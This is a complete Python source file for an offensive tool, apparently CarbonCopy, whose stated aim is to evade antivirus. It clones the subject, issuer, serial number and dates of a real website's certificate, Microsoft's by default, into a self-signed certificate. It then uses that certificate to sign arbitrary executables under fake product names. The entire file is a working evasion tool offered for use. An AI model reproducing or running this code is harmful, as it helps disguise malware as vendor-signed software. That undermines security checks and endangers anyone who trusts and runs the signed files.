#!/usr/bin/python3

# Author : Paranoid Ninja
# Email  : paranoidninja@protonmail.com
# Description  : Spoofs SSL Certificates and Signs executables to evade Antivirus
import sys
import time
import traceback

from config.Config import Config
from OpenSSL import crypto
from sys import argv, platform
from pathlib import Path
from utils.utils import get_project_root
import shutil
import ssl
import os
import subprocess

TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"


class CarbonCopy:
    def __init__(self, host='www.microsoft.com', port='443', arch="x64", banner=False, verbose=False):
        self.host = host
        self.port = port
        self.arch = arch
        self.banner = banner
        self.verbose = verbose
        self.certificate_directory = Path(os.path.join(get_project_root(), "certs"))

    def sign(self, signee, signed):
        if self.banner:
            print(r""" 
            +-+-+-+-+-+-+-+-+-+-+-+-+
            |C|a|r|b|o|n|S|i|g|n|e|r|
            +-+-+-+-+-+-+-+-+-+-+-+-+
    
             CarbonSigner v1.0
             Author: Paranoid Ninja
             """)

        try:
            # Fetching Details
            if self.verbose:
                print(f"[+] Loading public key of {self.host} in Memory...")
            ogcert = ssl.get_server_certificate((self.host, int(self.port)))
            x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

            self.certificate_directory.mkdir(exist_ok=True)

            # Creating Fake Certificate
            CNCRT = self.certificate_directory / (self.host + ".crt")
            CNKEY = self.certificate_directory / (self.host + ".key")
            PFXFILE = self.certificate_directory / (self.host + ".pfx")

            # Creating Keygen
            k = crypto.PKey()
            k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
            cert = crypto.X509()

            # Setting Cert details from loaded from the original Certificate
            if self.verbose:
                print("[+] Cloning Certificate Version")
            cert.set_version(x509.get_version())
            if self.verbose:
                print("[+] Cloning Certificate Serial Number")
            cert.set_serial_number(x509.get_serial_number())
            if self.verbose:
                print("[+] Cloning Certificate Subject")
            cert.set_subject(x509.get_subject())
            if self.verbose:
                print("[+] Cloning Certificate Issuer")
            cert.set_issuer(x509.get_issuer())
            if self.verbose:
                print("[+] Cloning Certificate Registration & Expiration Dates")
            cert.set_notBefore(x509.get_notBefore())
            cert.set_notAfter(x509.get_notAfter())
            cert.set_pubkey(k)
            if self.verbose:
                print("[+] Signing Keys")
            cert.sign(k, 'sha256')

            if self.verbose:
                print(f"[+] Creating {CNCRT} and {CNKEY}")
            CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
            CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
            if self.verbose:
                print("[+] Clone process completed. Creating PFX file for signing executable...")

            try:
                pfx = crypto.PKCS12()
            except AttributeError:
                pfx = crypto.PKCS12Type()
            pfx.set_privatekey(k)
            pfx.set_certificate(cert)
            pfxdata = pfx.export()

            PFXFILE.write_bytes(pfxdata)

            if platform == "win32":
                signtool = Config().get_path("SIGNERS", f"SIGNTOOL_{self.arch}")
                if self.verbose:
                    print("[+] Platform is Windows OS...")
                    print(f"[+] Signing {signee} with signtool.exe...")
                shutil.copy(signee, signed)
                time.sleep(1)

                args = (
                    f"\"{signtool}\"",
                    "sign",
                    "/v",
                    "/f", f"\"{PFXFILE}\"",
                    "/d", "\"MozDef Corp\"",
                    "/tr", TIMESTAMP_URL,
                    "/td", "SHA256",
                    "/fd", "SHA256",
                    f"\"{signed}\""
                )
                cmd = " ".join(args)
                try:
                    output = subprocess.check_output(cmd, shell=True)
                    if output.decode().find("Number of errors: 0") > -1:
                        return True
                    else:
                        return False
                except:
                    pass
            else:
                if self.verbose:
                    print("[+] Platform is Linux OS...")
                    print(f"[+] Signing {signee} with {PFXFILE} using osslsigncode...")
                args = ("osslsigncode", "sign", "-pkcs12", f"\"{PFXFILE}\"",
                        "-n", "Notepad Benchmark Util", "-i", TIMESTAMP_URL,
                        "-in", f"\"{signee}\"", "-out", f"\"{signed}\"")

                if self.verbose:
                    print("[+] ", end='', flush=True)
                cmd = " ".join(args)
                try:
                    output = subprocess.check_output(cmd, shell=True)
                    # Need to modify this
                    if output.decode().find("Number of errors: 0") > -1:
                        return True
                    else:
                        return False
                except:
                    pass

        except Exception as ex:
            traceback.print_exc()
            print(f"[X] Something Went Wrong!\n[X] Exception: {ex}")


def main():
    if len(argv) != 5:

        print("[+] Descr: Impersonates the Certificate of a website\n[!] Usage: " + argv[
            0] + " <hostname> <port> <build-executable> <signed-executable>\n")
    else:
        signer = CarbonCopy(argv[1], argv[2])
        signer.sign(argv[3], argv[4])


if __name__ == "__main__":
    main()
